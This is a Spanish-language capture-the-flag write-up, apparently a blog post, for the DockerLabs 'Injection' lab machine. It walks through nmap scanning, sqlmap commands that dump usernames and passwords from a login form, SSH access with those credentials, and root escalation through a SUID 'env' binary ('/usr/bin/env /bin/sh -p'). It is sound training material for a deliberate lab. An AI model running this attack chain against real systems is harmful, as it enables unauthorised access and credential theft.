---
title: CTF-DockerLabs-Injection
published: true
---

## WriteUps maquina Injection de DockerLabs

---
tags:
  - CTF
  - estado/completado
  - plataforma: [DockerLabs]
  - dificultad: Muy fácil
  - autor: [ElPinguinoDeMario]

# Datos

[!INFO] Injection
  -  **Nombre:** Injection
  -  **SO:** Linux
  -  **Dificultad:** Muy fácil
  -  **Enlace:** [Dockerlabs](https://dockerlabs.es/)

[!TODO] Objetivo
  - 🚩Ingresar a la maquina como algún usuario.
  - 🚩Elevar privilegios una vez obtenido el acceso.

El primer paso consiste en iniciar la máquina, lo cual es tan sencillo como ejecutar el siguiente comando después de haber descargado la maquina:

```bash
└─$ sudo bash auto_deploy.sh injection.tar
```

# Reconocimiento

  - Una vez iniciada la maquina, el mismo script de inicio me da la dirección IP a lo cual procedo a realizar un escaneo de puertos de la maquina y el resultado es el siguiente:

```bash
└─# nmap 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-22 15:28 EDT
Nmap scan report for 172.17.0.2
Host is up (0.0000060s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.27 seconds
```

Al darme cuenta que existe el `puerto 80` abierto, procedo a visitar desde el navegador la dirección IP de la maquina y me encuentro con una pantalla de login, donde es requerido un `User` y un `Password` que al chequear el código fuente, no encuentro nada interesante, pero si aplico la misma lógica que en las maquinas anteriores, respecto al nombre, ejemplo:

- [[Upload]] tenia que ver con la carga de archivos.
- [[Vacaciones]] con las vacaciones de juan.

Puedo pensar entonces que `injection` tenga que ver con `Inyección SQL` quizás, y para comprobar esto, voy a probar una herramienta que mi buen amigo El Pingüino de Mario enseña a utilizar en la [Academia de Ciberseguridad y Hacking Ético](https://elrincondelhacker.es/) El Rincón del Hacker y es `SQLmap` para ello utilizo el siguiente comando:

```bash
sqlmap -u http://172.17.0.2 --forms --dbs --batch
```

Lo que busco con este comando es que me muestre todas las base de datos que se encuentran en este sistema, el resultado es el siguiente:

```bash
[15:44:52] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL   -= 5.0 (MariaDB fork)
[15:44:52] [INFO] fetching database names
[15:44:52] [INFO] retrieved: 'information_schema'
[15:44:52] [INFO] retrieved: 'register'
[15:44:52] [INFO] retrieved: 'sys'
[15:44:52] [INFO] retrieved: 'mysql'
[15:44:52] [INFO] retrieved: 'performance_schema'
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] register
[*] sys
```

Entonces de acuerdo a ello, ya conozco que existen 5 bases de datos, que estamos ante un Ubuntu 22.04 con un Apache 2.4.52 y usando MariaDB.

Ahora usando la misma herramienta voy a seleccionar la base de datos `register` y que me muestre las tablas de esa bd con el siguiente comando:

```bash
sqlmap -u http://172.17.0.2 --forms -D register --tables --batch

```

Ya tengo la base de datos `register`, tengo la tabla `users` y ahora requiero las columnas, que lo saco así:

```
sqlmap -u http://172.17.0.2 --forms -D register -T users --columns --batch
```

Y ya por ultimo seria obtener los datos de esta columna con el siguiente comando:

```
sqlmap -u http://172.17.0.2 --forms -D register -T users -C passwd,username --dump --batch
```

Con esto logro obtener un usuario y contraseña validos para acceder al formulario web que aparece en el sitio web.

![dylanInjection.png](https://raw.githubusercontent.com/4k4m1m3/blog/main/_posts/adjuntos/dylanInjection.png)

  - **Nota:** Si deseas conocer más información sobre inyecciones SQL o el uso de SQLmap, te invito a visitar la [Academia de Ciberseguridad y Hacking Ético](https://elrincondelhacker.es/) donde te enseñan de estos y otros temas.

# Acceso por SSH

  - Lo interesante es que usando las credenciales encontradas con SQLmap he logrado ingresar por SSH a esta maquina, así que estando con el usuario `dylan` por SSH procedo a realizar un `sudo -l` y para mi sorpresa el resultado es:

`-bash: sudo: command not found`

Paso a revisar el directorio `/var/www/html` para chequear los permisos y los archivos allí, pero no encuentro nada especial, así que lo otro que intento es: `find / -perm -4000 -ls 2  -/dev/null` y el resultado es el siguiente:

```bash
dylan@e4df575277c7:~$ find / -perm -4000 -ls 2  -/dev/null
  1464485     72 -rwsr-xr-x   1 root     root        72712 Feb  6 13:54 /usr/bin/chfn
  1464553     72 -rwsr-xr-x   1 root     root        72072 Feb  6 13:54 /usr/bin/gpasswd
  1464611     48 -rwsr-xr-x   1 root     root        47480 Feb 21  2022 /usr/bin/mount
  1464627     60 -rwsr-xr-x   1 root     root        59976 Feb  6 13:54 /usr/bin/passwd
  1464717     36 -rwsr-xr-x   1 root     root        35192 Feb 21  2022 /usr/bin/umount
  1464491     44 -rwsr-xr-x   1 root     root        44808 Feb  6 13:54 /usr/bin/chsh
  1464691     56 -rwsr-xr-x   1 root     root        55672 Feb 21  2022 /usr/bin/su
  1484031     44 -rwsr-xr-x   1 root     root        43976 Jan  8 15:56 /usr/bin/env
  1464616     40 -rwsr-xr-x   1 root     root        40496 Feb  6 13:54 /usr/bin/newgrp
  1469073     36 -rwsr-xr--   1 root     messagebus    35112 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
  1469133    332 -rwsr-xr-x   1 root     root         338536 Jan  2 17:54 /usr/lib/openssh/ssh-keysign
```

Me voy para nuestra plataforma favorita [GTFOBins](https://gtfobins.github.io/) y busco uno a uno los scripts del listado para encontrar alguno que se pueda aprovechar con los `SUID`

- **/usr/bin/chfn:** No binary matches...
- **/usr/bin/gpasswd:** No binary matches...
- **/usr/bin/mount:** Sudo
- **/usr/bin/passwd:** No binary matches...
- **/usr/bin/chfn:** No binary matches...
- **/usr/bin/umount:** No binary matches...
- **/usr/bin/chsh:** No binary matches...
- **/usr/bin/su:** Sudo
- **/usr/bin/env:** Shell - SUID - Sudo
# Escalada de privilegios

Y allí encontramos, con mucha paciencia el script vulnerable `/usr/bin/env` a `SUID`, así que según el sitio [GTFOBins] si coloco:

```
sudo install -m =xs $(which env) .
ó
./env /bin/sh -p
```

Puedo acceder como root, pero al colocar el primero no me funciono pues el sudo esta desactivado, pero el segundo tampoco me funciono, pues debo colocar la ruta completa así y listo:

```
/usr/bin/env /bin/sh -p
```

Y allí si estamos dentro (¡PWNED!)

# Comandos

[!IMPORTANT] Resumen de comandos utilizados
  - `sudo bash auto_deploy.sh injection.tar`
  - `nmap 172.17.0.2`
  - `sqlmap -u http://172.17.0.2 --forms --dbs --batch`
  - `sqlmap -u http://172.17.0.2 --forms -D register --tables --batch`
  - `sqlmap -u http://172.17.0.2 --forms -D register -T users --columns --batch`
  - `sqlmap -u http://172.17.0.2 --forms -D register -T users -C passwd,username --dump --batch`
  - `find / -perm -4000 -ls 2  -/dev/null`
  - `/usr/bin/env /bin/sh -p`


```
¡Que la fuerza del hacking ético nos acompañe! :)
```

|   |
|:--|
|   |